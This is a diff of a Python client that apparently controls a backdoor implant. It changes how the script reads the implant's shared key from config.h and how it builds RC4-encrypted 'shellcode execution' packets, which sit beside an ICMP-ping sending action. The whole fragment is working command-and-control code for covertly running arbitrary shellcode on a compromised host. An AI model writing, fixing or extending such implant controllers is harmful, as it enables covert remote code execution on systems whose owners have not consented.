@@ -107,7 +107,8 @@ def read_key(key):
         return key
 
     config_h = open(os.path.dirname(os.path.abspath(__file__)) + '/src/config.h').read()
-    return re.search(r'#define +vr_shared_key +"(.+)"', config_h).group(1)
+    key_integer = re.search(r'#define +vr_shared_key +(.+)', config_h).group(1).rstrip('l').rstrip('u')
+    return struct.pack('<Q', int(key_integer, 16 if key_integer.startswith('0x') else 10))
 
 
 def main(argv):
@@ -150,8 +151,8 @@ def main(argv):
         # Format a shellcode execution packet
         if args.action == 'shellcode':
             command_id = 0
-            payload = struct.pack('!IIB', magic_v1, int(time.time()), command_id) + read_payload(args.payload)
-            payload = rc4(payload, read_key(key).encode())
+            payload = struct.pack('!IIB', magic_v1, int(time.time()), command_id) + read_payload(args.src)
+            payload = rc4(payload, read_key(key))
 
         # Send src via icmp-ping
         elif args.action == 'ping':
